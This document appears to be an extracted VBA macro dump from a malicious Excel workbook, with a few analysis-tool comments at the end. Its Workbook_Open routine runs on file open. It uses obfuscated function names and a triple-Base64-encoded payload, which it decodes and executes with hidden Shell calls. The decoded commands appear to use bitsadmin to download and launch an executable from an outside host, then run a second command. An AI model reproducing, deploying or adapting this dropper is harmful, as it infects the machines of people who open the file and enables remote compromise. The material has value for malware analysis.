Attribute VB_Name = "Module1"
Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'wtf
Option Explicit
Private InitDone  As Boolean
Private Map1(0 To 63)  As Byte
Private Map2(0 To 127) As Byte
Public Function FShKSDFHkKGHFsdgew(ByVal s As String) As String
   FShKSDFHkKGHFsdgew = YGYerghsdhERTERER(FSbHMGBHMmjklJKLJKJHsdfsdf(s))
End Function
Public Function YGYerghsdhERTERER(InData() As Byte)
   YGYerghsdhERTERER = FSKJHkdfgjkGjhrdfgsdfgewtew(InData, UBound(InData) - LBound(InData) + 1)
End Function
Public Function FSKJHkdfgjkGjhrdfgsdfgewtew(InData() As Byte, ByVal InLen As Long) As String
   If Not InitDone Then Init
   If InLen = 0 Then FSKJHkdfgjkGjhrdfgsdfgewtew = "": Exit Function
   Dim ODataLen As Long: ODataLen = (InLen * 4 + 2) \ 3     ' output length without padding
   Dim OLen As Long: OLen = ((InLen + 2) \ 3) * 4           ' output length including padding
   Dim Out() As Byte
   ReDim Out(0 To OLen - 1) As Byte
   Dim ip0 As Long: ip0 = LBound(InData)
   Dim ip As Long
   Dim op As Long
   Do While ip < InLen
      Dim i0 As Byte: i0 = InData(ip0 + ip): ip = ip + 1
      Dim i1 As Byte: If ip < InLen Then i1 = InData(ip0 + ip): ip = ip + 1 Else i1 = 0
      Dim i2 As Byte: If ip < InLen Then i2 = InData(ip0 + ip): ip = ip + 1 Else i2 = 0
      Dim o0 As Byte: o0 = i0 \ 4
      Dim o1 As Byte: o1 = ((i0 And 3) * &H10) Or (i1 \ &H10)
      Dim o2 As Byte: o2 = ((i1 And &HF) * 4) Or (i2 \ &H40)
      Dim o3 As Byte: o3 = i2 And &H3F
      Out(op) = Map1(o0): op = op + 1
      Out(op) = Map1(o1): op = op + 1
      Out(op) = IIf(op < ODataLen, Map1(o2), Asc("=")): op = op + 1
      Out(op) = IIf(op < ODataLen, Map1(o3), Asc("=")): op = op + 1
      Loop
   FSKJHkdfgjkGjhrdfgsdfgewtew = ASDFNjJKdbhHKsdgsd(Out)
End Function

Public Function FHKKGdfjhJHDFshsgjgfdgdsf(ByVal s As String) As String
   If s = "" Then FHKKGdfjhJHDFshsgjgfdgdsf = "": Exit Function
   FHKKGdfjhJHDFshsgjgfdgdsf = ASDFNjJKdbhHKsdgsd(FSGHbJGBjhdfgkJKGHkdgbsdf(s))
End Function
Public Function FSGHbJGBjhdfgkJKGHkdgbsdf(ByVal s As String) As Byte()
   If Not InitDone Then Init
   Dim IBuf() As Byte: IBuf = FSbHMGBHMmjklJKLJKJHsdfsdf(s)
   Dim ILen As Long: ILen = UBound(IBuf) + 1
   If ILen Mod 4 <> 0 Then Err.Raise vbObjectError, , "Length of Base64 encoded input string is not a multiple of 4."
   Do While ILen > 0
      If IBuf(ILen - 1) <> Asc("=") Then Exit Do
      ILen = ILen - 1
      Loop
   Dim OLen As Long: OLen = (ILen * 3) \ 4
   Dim Out() As Byte
   ReDim Out(0 To OLen - 1) As Byte
   Dim ip As Long
   Dim op As Long
   Do While ip < ILen
      Dim i0 As Byte: i0 = IBuf(ip): ip = ip + 1
      Dim i1 As Byte: i1 = IBuf(ip): ip = ip + 1
      Dim i2 As Byte: If ip < ILen Then i2 = IBuf(ip): ip = ip + 1 Else i2 = Asc("A")
      Dim i3 As Byte: If ip < ILen Then i3 = IBuf(ip): ip = ip + 1 Else i3 = Asc("A")
      If i0 > 127 Or i1 > 127 Or i2 > 127 Or i3 > 127 Then _
         Err.Raise vbObjectError, , "Illegal character in Base64 encoded data."
      Dim b0 As Byte: b0 = Map2(i0)
      Dim b1 As Byte: b1 = Map2(i1)
      Dim b2 As Byte: b2 = Map2(i2)
      Dim b3 As Byte: b3 = Map2(i3)
      If b0 > 63 Or b1 > 63 Or b2 > 63 Or b3 > 63 Then _
         Err.Raise vbObjectError, , "Illegal character in Base64 encoded data."
      Dim o0 As Byte: o0 = (b0 * 4) Or (b1 \ &H10)
      Dim o1 As Byte: o1 = ((b1 And &HF) * &H10) Or (b2 \ 4)
      Dim o2 As Byte: o2 = ((b2 And 3) * &H40) Or b3
      Out(op) = o0: op = op + 1
      If op < OLen Then Out(op) = o1: op = op + 1
      If op < OLen Then Out(op) = o2: op = op + 1
      Loop
   FSGHbJGBjhdfgkJKGHkdgbsdf = Out
End Function
Private Sub Init()
   Dim c As Integer, i As Integer
   ' set Map1
   i = 0
   For c = Asc("A") To Asc("Z"): Map1(i) = c: i = i + 1: Next
   For c = Asc("a") To Asc("z"): Map1(i) = c: i = i + 1: Next
   For c = Asc("0") To Asc("9"): Map1(i) = c: i = i + 1: Next
   Map1(i) = Asc("+"): i = i + 1
   Map1(i) = Asc("/"): i = i + 1
   ' set Map2
   For i = 0 To 127: Map2(i) = 255: Next
   For i = 0 To 63: Map2(Map1(i)) = i: Next
   InitDone = True
End Sub
Private Function FSbHMGBHMmjklJKLJKJHsdfsdf(ByVal s As String) As Byte()
   Dim b1() As Byte: b1 = s
   Dim l As Long: l = (UBound(b1) + 1) \ 2
   If l = 0 Then FSbHMGBHMmjklJKLJKJHsdfsdf = b1: Exit Function
   Dim b2() As Byte
   ReDim b2(0 To l - 1) As Byte
   Dim p As Long
   For p = 0 To l - 1
      Dim c As Long: c = b1(2 * p) + 256 * CLng(b1(2 * p + 1))
      If c >= 256 Then c = Asc("?")
      b2(p) = c
      Next
   FSbHMGBHMmjklJKLJKJHsdfsdf = b2
   End Function
   Private Function ASDFNjJKdbhHKsdgsd(b() As Byte) As String
   Dim l As Long: l = UBound(b) - LBound(b) + 1
   Dim b2() As Byte
   ReDim b2(0 To (2 * l) - 1) As Byte
   Dim p0 As Long: p0 = LBound(b)
   Dim p As Long
   For p = 0 To l - 1: b2(2 * p) = b(p0 + p): Next
   Dim s As String: s = b2
   ASDFNjJKdbhHKsdgsd = s
   End Function
Private Sub Workbook_Open()

' Encodes a string into Base64 format.
' No blanks or line breaks are inserted.
' Parameters:
'   S         a String to be encoded.
' Returns:    a String with the Base64 encoded data.


' Encodes a byte array into Base64 format.
' No blanks or line breaks are inserted.
' Parameters:
'   InData    an array containing the data bytes to be encoded.
' Returns:    a string with the Base64 encoded data.


' Encodes a byte array into Base64 format.
' No blanks or line breaks are inserted.
' Parameters:
'   InData    an array containing the data bytes to be encoded.
'   InLen     number of bytes to process in InData.
' Returns:    a string with the Base64 encoded data.


' Decodes a string from Base64 format.
' Parameters:
'    s        a Base64 String to be decoded.
' Returns     a String containing the decoded data.


' Decodes a byte array from Base64 format.
' Parameters
'   s         a Base64 String to be decoded.
' Returns:    an array containing the decoded data bytes.

Dim asdjdgjhaswdGHgvdsf As String
asdjdgjhaswdGHgvdsf = FHKKGdfjhJHDFshsgjgfdgdsf(FHKKGdfjhJHDFshsgjgfdgdsf(FHKKGdfjhJHDFshsgjgfdgdsf("V1RJeGEweHRWalJhVTBGMldYbENhV0ZZVW5wWlYxSjBZVmMwWjB3elVubFpWelY2V20xV2VVbEhNVFZoYlRscFNVTTVhMkl6WkhWaVJ6bG9Xa05CZG1OSVNuQmlNMHB3WkVocloyRkhiRzVoUTBKdlpFaFNkMDlwT0haYWJrcG9ZbTEwTlZsWVRuSmhVelY1WkZNNU5Fd3pUbXhrU0ZaM1RWTTFiR1ZIVldkSmFWWXdXbGN4ZDBwV2VHOWFiWEJ3V2xoT2JscHRhSHBoVjFwdVl6Sm9kbUZYV2pGak1tUnRURzFXTkZwVFNXZFFiVFV4WWtOYWVtUkhSbmxrUTBGc1pFZFdkR05EVm1OaFIxcHhZVmRXZWxveVdtOWpNbXh0V2pOT2IySXliRzFrV0U1dVdtazFiR1ZIVldkS2FVSnBZVmhTZWxsWFVuUmhWelJuVEROU2VWbFhOWHBhYlZaNVNVY3hOV0Z0T1dsSlF6bHJZak5rZFdKSE9XaGFRMEYyWTBoS2NHSXpTbkJrU0d0bllVZHNibUZEUW05a1NGSjNZM3B2ZGt3eVJYVmpSemwwV21rMWFsbFlVWFphVjBadVlrZHdNa3h1YUhOamVVRnBVWHB3WTFaWVRteGpiazVqVlVoV2FXSkhiR3BZUlZKMldUTldkRnBYTlRCak1YaFVXVmN4ZDJKSFZYVmxSM2g2U1djOVBRPT0=")))
Dim Adasdjhsad As Integer
Adasdjhsad = Shell(asdjdgjhaswdGHgvdsf, vbHide)
Dim aFile As String
aFile = FHKKGdfjhJHDFshsgjgfdgdsf(FHKKGdfjhJHDFshsgjgfdgdsf(FHKKGdfjhJHDFshsgjgfdgdsf("VVhwd1kxWllUbXhqYms1alZVaFdhV0pIYkdwWVJWSjJXVE5XZEZwWE5UQmpNWGhVV1ZjeGQySkhWWFZsUjNoNg==")))
Dim sdfksfkaskdj As String
sdfksfkaskdj = FHKKGdfjhJHDFshsgjgfdgdsf(FHKKGdfjhJHDFshsgjgfdgdsf(FHKKGdfjhJHDFshsgjgfdgdsf("V1RJeGEweHRWalJhVTBGMldYbENlbVJIUm5sa1EwSkVUMng0Vm1NeVZubGpNWGhSWkZkS2MyRlhUbU5TUnpscVpGY3hiR0p1VW5wWVJrNW9ZbGhDYzFwVE5UUmlTRTA5")))
Dim Adsdf As Boolean
Adsdf = False
Do Until Adsdf = True
If Len(Dir$(aFile)) > 0 Then
     Dim Niasdjasd As Integer
     Niasdjasd = Shell(sdfksfkaskdj, vbHide)
     Adsdf = True
End If
Loop
End Sub






' InQuest injected base64 decoded content
' 0`G2h
' WTIxa0xtVjRaU0F2WXlCaWFYUnpZV1J0YVc0Z0wzUnlZVzV6Wm1WeUlHMTVhbTlpSUM5a2IzZHViRzloWkNBdmNISnBiM0pwZEhrZ2FHbG5hQ0JvZEhSd09pOHZabkpoYm10NVlYTnJhUzV5ZFM5NEwzTmxkSFZ3TVM1bGVHVWdJaVYwWlcxd0pWeG9abXBwWlhOblptaHphV1puYzJodmFXWjFjMmRtTG1WNFpTSWdQbTUxYkNaemRHRnlkQ0FsZEdWdGNDVmNhR1pxYVdWeloyWm9jMmxtWjNOb2IybG1kWE5uWmk1bGVHVWdKaUJpYVhSellXUnRhVzRnTDNSeVlXNXpabVZ5SUcxNWFtOWlJQzlrYjNkdWJHOWhaQ0F2Y0hKcGIzSnBkSGtnYUdsbmFDQm9kSFJ3Y3pvdkwyRXVjRzl0Wmk1allYUXZaV0ZuYkdwMkxuaHNjeUFpUXpwY1ZYTmxjbk5jVUhWaWJHbGpYRVJ2WTNWdFpXNTBjMXhUWVcxd2JHVXVlR3h6SWc9PQ==
' UXpwY1ZYTmxjbk5jVUhWaWJHbGpYRVJ2WTNWdFpXNTBjMXhUWVcxd2JHVXVlR3h6
' WTIxa0xtVjRaU0F2WXlCemRHRnlkQ0JET2x4VmMyVnljMXhRZFdKc2FXTmNSRzlqZFcxbGJuUnpYRk5oYlhCc1pTNTRiSE09

INQUEST-PP=macro
